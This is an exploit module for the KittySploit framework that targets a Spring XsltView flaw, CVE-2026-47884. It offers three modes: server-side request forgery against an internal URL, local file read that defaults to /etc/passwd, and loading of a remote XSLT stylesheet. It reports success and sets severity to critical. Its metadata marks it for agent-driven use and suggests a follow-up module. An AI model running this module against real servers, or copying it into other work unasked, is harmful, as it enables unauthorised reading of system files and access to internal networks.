#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-47884 — Spring XsltView SSRF / LFI / remote stylesheet."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.spring_xslt import Spring_xslt


class Module(Auxiliary, Http_client, Spring_xslt):
    __info__ = {
        "name": "Spring XsltView CVE-2026-47884 probe",
        "description": "SSRF, file:// read, or remote XSLT URL in view name.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-47884"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-47884"],
        "tags": ["spring", "xslt", "ssrf", "cve-2026-47884", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["ssrf", "file_read"],
            "chain": {
                "suggested_followups": ["scanner/http/spring_xslt_cve_2026_47884_detect"],
            },
        },
    }

    xslt_endpoint = OptString("/xslt/", "XsltView URL prefix", required=False)
    mode = OptString("ssrf", "ssrf | lfi | remote", required=False)
    ssrf_url = OptString(
        "http://127.0.0.1/",
        "URL for ssrf/remote mode",
        required=False,
    )
    lfi_path = OptString("/etc/passwd", "File path for lfi mode", required=False)

    def run(self):
        ep = str(self.xslt_endpoint or "/xslt/")
        mode = str(self.mode or "ssrf").lower()
        if mode == "lfi":
            code, body, ok = self.xslt_lfi(str(self.lfi_path or "/etc/passwd"), ep)
            label = "LFI"
        elif mode == "remote":
            url = str(self.ssrf_url or "")
            code, body, ok = self.xslt_remote_stylesheet(url, ep)
            label = "remote XSLT"
        else:
            url = str(self.ssrf_url or "http://127.0.0.1/")
            code, body, ok = self.xslt_ssrf(url, ep)
            label = "SSRF"
        if not ok:
            print_error(f"{label} not confirmed (HTTP {code})")
            return False
        print_success(f"{label} — HTTP {code}")
        print_status(body[:400])
        self.set_info(severity="critical", cve="CVE-2026-47884", mode=mode, http=code)
        return True